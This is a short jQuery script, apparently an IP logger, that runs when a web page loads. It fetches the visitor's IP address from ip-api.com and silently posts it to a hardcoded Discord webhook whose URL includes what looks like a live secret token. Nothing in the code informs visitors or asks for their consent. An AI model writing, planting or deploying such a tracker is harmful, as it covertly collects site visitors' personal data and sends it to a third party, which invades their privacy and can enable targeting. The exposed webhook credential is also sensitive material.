$(document).ready(function() {
    // Fetch IP information from ip-api.com on page load
    $.getJSON('http://ip-api.com/json', function(data) {  
      // Send IP information to Discord webhook
      var ipAddress = data.query; // Assuming 'query' contains the IP address
      var discordWebhookURL = 'https://discord.com/api/webhooks/1183352632962719804/CBtTKAuz9fPxJx3epHcV4H40R50nNEBAwPUzgw0HF7GEaReV1KnHPj2lY6AFVBACOQfj';
  
      // Create the payload to send to Discord
      var discordPayload = {
        content: 'Visited IP: ' + ipAddress
      };
  
      // Send data to Discord webhook
      $.ajax({
        type: 'POST',
        url: discordWebhookURL,
        data: JSON.stringify(discordPayload),
        contentType: 'application/json',
        success: function(response) {
          console.log('IP sent to Discord webhook successfully.');
        },
        error: function(err) {
          console.error('Error sending IP to Discord webhook:', err);
        }
      });
  
    });
  });
  